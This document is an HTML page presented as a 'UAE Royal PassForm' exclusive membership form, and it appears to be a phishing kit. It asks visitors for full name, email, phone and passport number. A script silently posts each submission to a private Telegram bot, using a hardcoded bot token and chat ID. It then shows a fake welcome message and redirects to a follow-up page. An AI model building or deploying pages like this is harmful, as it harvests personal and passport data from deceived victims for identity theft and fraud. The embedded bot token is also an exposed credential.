<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE Royal PassForm</title>
    <style>
        :root {
            --royal-gold: #d4af37;
            --deep-brown: #5c3a21;
            --light-bg: #f5f0e6;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: var(--light-bg);
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .main-heading {
            color: var(--deep-brown);
            margin-top: 30px;
        }
        .form-container {
            background: white;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            margin: 20px auto;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--deep-brown);
            border-radius: 5px;
        }
        .submit-btn {
            background: var(--royal-gold);
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            font-size: 1.1em;
            border-radius: 5px;
        }
        .submit-btn:hover {
            background: #b9972e;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            animation: fadeIn 0.5s ease-out;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--royal-gold);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            margin: 15px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        footer {
            margin-top: 20px;
            background: var(--deep-brown);
            color: white;
            padding: 10px;
        }
    </style>
</head>
<body>

    <header>
        <h1 class="main-heading">
            UAE ROYAL PASSFORM
            <div class="arabic-text" style="font-size: 0.6em; margin-top: 10px;">النخبة الملكية</div>
        </h1>
    </header>

    <div class="form-container">
        <h2 style="color: var(--deep-brown);">Exclusive Membership Form</h2>
        <form id="royalForm">
            <div class="form-group">
                <input type="text" name="Full Name" placeholder="Full Name" required>
            </div>
            <div class="form-group">
                <input type="email" name="Email" placeholder="Email Address" required>
            </div>
            <div class="form-group">
                <input type="tel" name="Phone Number" placeholder="Phone Number" required>
            </div>
            <div class="form-group">
                <input type="text" name="Passport Number" placeholder="Passport Number" required>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>

    <div class="modal" id="successModal">
        <div class="modal-content">
            <h2 style="color: var(--royal-gold);">Welcome to Royalty!</h2>
            <p style="color: var(--deep-brown); margin: 20px 0;">Your royal membership application has been received.</p>
            <div class="loader"></div>
            <div class="arabic-text" style="margin-top: 20px;">مرحباً بكم في النخبة الملكية</div>
        </div>
    </div>

    <footer>
        <p>&copy; 2024 UAE Royal PassForm - Exclusive Membership</p>
        <div class="arabic-text" style="margin-top: 10px;">النخبة الملكية - جميع الحقوق محفوظة</div>
    </footer>

    <script>
    document.getElementById('royalForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        // Gather form data
        const formData = new FormData(this);
        let message = "📩 *New Membership Submission*\n\n"; 

        formData.forEach((value, key) => {  
            message += `*${key}*: ${value}\n`;  // Bold key for Telegram markdown
        });

        // Telegram bot details (Use a secure backend to avoid exposing tokens)
        const telegramBotToken = '8063411052:AAER6bkwykWh-5xfTsb63mFbn7Y91LPL414';  
        const chatId = '8184256931';  
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            await fetch(telegramUrl, {  
                method: 'POST',  
                headers: { 'Content-Type': 'application/json' },  
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })  
            });

            // Show success modal
            const modal = document.getElementById('successModal');  
            modal.style.display = 'flex';

            // Redirect after 3 seconds
            setTimeout(() => {  
                window.location.href = 'memberauth.html';  
            }, 3000);  

        } catch (error) {
            console.error("Error sending message to Telegram:", error);
            alert("Failed to send. Please try again.");
        }
    });
    </script>

</body>
</html>
